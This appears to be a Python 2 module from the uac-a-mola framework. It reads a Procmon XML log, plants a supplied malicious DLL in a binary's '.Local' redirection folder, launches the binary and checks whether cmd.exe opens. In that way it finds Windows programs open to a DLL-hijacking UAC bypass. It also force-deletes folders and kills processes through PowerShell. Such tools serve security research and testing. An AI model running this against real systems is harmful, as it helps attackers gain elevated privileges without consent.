# This file is part of uac-a-mola
# Copyright (C) Santiago Hernandez Ramos <shramos@protonmail.com>
#
# DESCRIPTION
# This file parses an xml produced by Procmon application and returns
# a list of binaries that are vulnerable to dll hijacking uac bypass


from module import Module
from modules.investigate.procmon_xml_parser import CustomModule as Xml_parser
from support.procmonXMLparser import ProcmonXmlParser
import support.procmonXMLfilter as Filter
import time
import subprocess
import psutil


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "DLL discovery",
                       "Description": "This module searches in a list of binaries for DLL hijacking UAC bypass",
                       "Author": "Santiago Hernandez Ramos"}

        # -----------name-----default_value--description
        options = {"binlist": [None, "Path to a list of binaries for testing", True],
                   "xml_file": [None, "Path to a procmon like XML file", True],
                   "malicious_dll": [None, "Path to a malicious dll", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._results = {"vulnerables": [], "sospechosos": []}
        self.p = None
        self.events = None
        self.events_nf = None

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        self.init_import_modules()

        for b in self.binaries():
            print "\n[*] Analizing binary: " + b
            events = Filter.by_process(self.p, b)
            events = Filter.by_operation(events, "CreateFile")
            for e in events['CreateFile']:
                print e.find("Path")
                path = e.find("Path").text
                print path
                if b + ".Local" in path:
                    self.handle_dll_local(path, b)
        self.results()

    def init_import_modules(self):
        parser = ProcmonXmlParser(self.args["xml_file"])
        self.p = parser.parse()

    def handle_dll_local(self, subpath, binary):
        path = subpath + "\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.15063.0_none_583b8639f462029f\\"
        try:
            try:
                subprocess.check_call(
                    ["powershell", "-C", "rm", "-r", "-Force", subpath, "-erroraction", "'silentlycontinue'"])
            except:
                pass

            subprocess.check_call(
                ["powershell", "-C", "mkdir", path])

            subprocess.check_call(
                ["powershell", "-C", "cp", self.args["malicious_dll"], path])

            prev_pids = psutil.pids()
            subprocess.check_call(["powershell", "-C", binary])
            time.sleep(1)
            if self.is_cmd_open():
                if binary not in self._results["vulnerables"]:
                    self._results["vulnerables"].append(binary)
            else:
                if binary not in self._results['sospechosos']:
                    self._results['sospechosos'].append(binary)

            new_pids = psutil.pids()

            self.kill(binary, prev_pids, new_pids)

            subprocess.check_call(
                ["powershell", "-C", "rm", "-r", "-Force", subpath])

            print "deleted"

        except subprocess.CalledProcessError as error:
            print "ERROR: COPYING THE FILE"

    def results(self):
        print "VULNERABLES:"
        for r in self._results["vulnerables"]:
            print r
        print "\nSOSPECHOSOS:"
        for r in self._results["sospechosos"]:
            print r

    def kill(self, proc, last_pids=None, new_pids=None):
        new_pids = self.last_process_created(last_pids, new_pids)
        try:
            for p in new_pids:
                subprocess.check_call(["tskill", str(p)])
        except subprocess.CalledProcessError:
            print "[!!] The process %s can't be killed" % proc
            return

    def last_process_created(self, prev_pids, new_pids):
        pids = []
        for p in new_pids:
            if p not in prev_pids:
                pids.append(p)
        return pids

    def is_cmd_open(self):
        try:
            return 'cmd.exe' in [psutil.Process(p).name() for p in psutil.pids()]
        except:
            pass

    def binaries(self):
        with open(self.args["binlist"], 'r') as binfile:
            return binfile.read().splitlines()
